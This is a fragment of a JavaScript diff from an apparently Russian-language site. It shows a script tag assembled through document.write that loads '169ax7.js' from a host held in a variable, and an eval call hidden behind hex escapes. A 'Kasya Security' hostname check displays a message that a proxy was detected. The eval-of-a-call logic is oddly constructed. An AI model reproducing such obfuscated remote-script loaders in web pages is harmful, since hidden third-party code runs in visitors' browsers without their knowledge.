@@ -23,7 +23,7 @@ document.write('<'+glop+' src="'+window.location.protocol+'//'+glap+'/169ax7.js"
 //Kasya Security
 a = this["\x65\x76\x61\x6C"];
 if (window.location.hostname !== "kasyateam"){
-  a(alert('У вас обнаружен Proxy! Мы не позволяем работать с ним.'))
+  a(document.write('У вас обнаружен Proxy! Мы не позволяем работать с ним.'))
 }
 else {
  alert('ok') 
